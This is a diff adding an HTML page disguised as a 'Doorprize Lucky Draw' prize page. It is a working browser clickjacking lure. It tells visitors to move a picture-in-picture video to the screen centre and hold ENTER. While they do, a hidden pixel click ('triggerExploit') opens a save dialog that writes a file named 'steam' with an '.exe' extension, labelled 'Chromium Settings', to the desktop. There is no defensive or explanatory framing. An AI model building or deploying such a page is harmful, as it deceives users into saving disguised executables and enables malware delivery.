@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Doorprize Center 🎁</title>
+    <style>
+        body {
+            background: #1e1e2f;
+            color: white;
+            font-family: 'Segoe UI', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 42px;
+            color: #C6F91F;
+        }
+
+        p {
+            font-size: 20px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background: #1ebe8e;
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            font-size: 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #17a076;
+        }
+
+        #instructions {
+            margin-top: 40px;
+            font-size: 18px;
+            color: #aaa;
+        }
+
+        #gameover {
+            margin-top: 40px;
+            font-size: 20px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+ <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>Place the prize box here.<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>  
+
+    <h1>🎁 Doorprize Lucky Draw</h1>
+    <p>Click the button below, then move the video to the center of the screen!</p>
+    <button onclick="startPiP()">🎬 Show Doorprize Video</button>
+
+    <div id="instructions">
+        After that, press and hold the <b>ENTER</b> key for 5 seconds to claim your prize!
+    </div>
+
+    <h3 id="gameover"></h3>
+
+    <video id="myVideo" src="https://selebewsss.github.io/spofcenah2/0316(1).mp4" muted autoplay playsinline style="display: none;"></video>
+    <div id="pixel" style="width:1px;height:1px;position:absolute;top:0;left:0;opacity:0;"></div>
+
+    <script>
+        let countEnter = 0;
+        let triggered = false;
+
+        // Start PiP
+        async function startPiP() {
+            const video = document.getElementById('myVideo');
+            try {
+                await video.play();
+                await video.requestPictureInPicture();
+                document.getElementById('instructions').innerHTML =
+                    "<br><br>✅ Video is now showing.<br>📍 Please move it to the CENTER of the screen.<br>  <button>🎬 press and hold ENTER to start.</button>";
+            } catch (err) {
+                alert("Failed to open Picture-in-Picture. Please try again.");
+                console.error(err);
+            }
+        }
+
+        // Change video and trigger download
+        async function triggerExploit() {
+            triggered = true;
+            swapVideo(); // change to rws.mp4
+            document.getElementById("pixel").click(); // trigger file save
+        }
+
+        // Swap video in PiP
+        async function swapVideo() {
+            const video = document.getElementById('myVideo');
+            try {
+                await video.pause();
+                video.src = "https://selebewsss.github.io/spofcenah2/0426.mp4";
+                await video.load();
+                await video.play();
+                if (document.pictureInPictureElement) {
+                    await video.requestPictureInPicture();
+                }
+            } catch (e) {
+                console.error("Failed to swap video:", e);
+            }
+        }
+
+        // File Save (download)
+        async function fileSave() {
+            try {
+                const options = {
+                    startIn: 'desktop',
+                    suggestedName: 'steam',
+                    types: [
+                        {
+                            description: 'Chromium Settings',
+                            accept: {
+                                'text/plain': ['.exe']
+                            }
+                        }
+                    ],
+                    excludeAcceptAllOption: true
+                };
+
+                const handle = await window.showSaveFilePicker(options);
+                const writable = await handle.createWritable();
+                const response = await fetch('cat.jpg');
+                await response.body.pipeTo(writable);
+                document.getElementById("gameover").textContent = "🎯 Doorprize successfully claimed!";
+            } catch (e) {
+                console.warn("Download canceled or failed:", e);
+            }
+        }
+
+        // Pixel to trigger save
+        document.getElementById("pixel").addEventListener("click", () => {
+            fileSave();
+        });
+
+        // Keyboard Listener
+        document.body.onkeydown = e => {
+            if (e.key === "Enter") {
+                countEnter++;
+                if (countEnter > 5 && !triggered) {
+                    triggerExploit();
+                }
+            }
+        };
+
+        document.body.onkeyup = e => {
+            if (e.key === "Enter") {
+                countEnter = 0;
+            }
+        };
+    </script>
+
+</body>
+</html>
